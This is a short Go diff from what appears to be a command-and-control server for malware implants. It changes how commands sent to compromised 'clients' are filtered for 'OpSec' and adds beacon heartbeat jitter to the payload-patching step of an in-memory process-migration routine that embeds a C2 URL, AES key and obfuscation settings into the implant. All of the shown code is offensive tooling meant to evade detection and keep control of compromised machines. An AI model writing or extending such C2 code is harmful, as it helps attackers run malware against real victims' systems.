@@ -8,7 +8,6 @@ import (
 	"log"
 	"os"
 	"path/filepath"
-	"strings"
 	"time"
 )
 
@@ -20,8 +19,10 @@ func SendCommand(uuid string, command string) error {
 	}
 	client := val.(*globals.Client)
 
-	// OpSec: Filter out obvious UI pings if they ever reach here
-	if strings.Contains(command, "ping") { return nil }
+	// OpSec: 精确过滤 UI 发送的 ping 心跳包（仅匹配 JSON 格式的 {"type":"ping"}）
+	if command == `{"type":"ping"}` || command == "ping" {
+		return nil
+	}
 
 	reqID := fmt.Sprintf("CMD-%d", globals.GetNextReqID())
 	msg := globals.MessageWrapper{
@@ -128,13 +129,15 @@ func MigrateToMemory(uuid string, targetProcess string) error {
 	// Fetch security context from parent client or listener
 	salt := client.EncryptionSalt
 	obf := client.ObfuscateMode
+	jitter := 30
 	if val, ok := globals.Listeners.Load(client.ListenerID); ok {
 		ln := val.(*globals.Listener)
 		if salt == "" { salt = ln.EncryptionSalt }
 		if obf == "" { obf = ln.ObfuscateMode }
+		jitter = ln.HeartbeatJitter
 	}
 
-	patched, err := PatchPayload(raw, c2url, aesKey, 10, "", false, 0, salt, obf)
+	patched, err := PatchPayload(raw, c2url, aesKey, 10, jitter, "", false, 0, salt, obf)
 	if err != nil { return fmt.Errorf("failed to patch migration template: %v", err) }
 
 	reqID := fmt.Sprintf("MIG-%d", globals.GetNextReqID())
